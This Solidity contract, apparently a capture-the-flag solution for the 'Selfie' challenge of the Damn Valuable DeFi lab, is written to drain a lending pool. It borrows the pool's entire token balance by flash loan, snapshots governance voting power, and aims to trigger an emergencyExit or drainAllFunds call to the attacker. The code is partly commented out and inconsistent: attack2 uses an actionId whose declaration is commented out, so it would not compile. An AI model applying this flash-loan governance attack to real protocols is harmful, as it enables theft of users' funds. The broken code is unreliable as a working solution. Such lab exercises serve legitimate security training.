// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableTokenSnapshot.sol";
import "../selfie/SelfiePool.sol";
import "../selfie/SimpleGovernance.sol";

error SelfieHackNotReceiveLoan();

contract SelfieHack is IERC3156FlashBorrower {
    DamnValuableTokenSnapshot public token;
    SelfiePool public pool;
    SimpleGovernance public governance;

    // uint256 public actionId;

    constructor(address _token, address _pool, address _governance) {
        token = DamnValuableTokenSnapshot(_token);
        pool = SelfiePool(_pool);
        governance = SimpleGovernance(_governance);
    }

    fallback() external {
        token.snapshot();
        token.transfer(address(pool), token.balanceOf(address(this)));
    }

    function onFlashLoan(
        address _initiator,
        address _token,
        uint256 _amount,
        uint256 _fee,
        bytes calldata _data
    ) external returns (bytes32) {
        // pool.flashLoan(IERC3156FlashBorrower(_initiator), _token, _amount, _data);

        // actionId = governance.queueAction(
        //     address(pool),
        //     0,
        //     abi.encodeWithSignature(
        //         "drainAllFunds(address)",
        //         address(msg.sender)
        //     )
        // );
        if (token.balanceOf(address(this)) != token.balanceOf(address(pool)))
            revert SelfieHackNotReceiveLoan();
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function attack() external {
        bytes memory data = abi.encodeWithSignature(
            "emergencyExit(address)",
            address(msg.sender)
        );
        pool.flashLoan(
            IERC3156FlashBorrower(address(this)),
            address(token),
            token.balanceOf(address(pool)),
            data
        );
        // This will run after the snapshot
        // actionId = governance.queueAction(
        //     address(pool),
        //     0,
        //     abi.encodeWithSignature(
        //         "emergencyExit(address)",
        //         address(msg.sender)
        //     )
        // );
    }

    function attack2() external {
        governance.executeAction(actionId);
    }
}
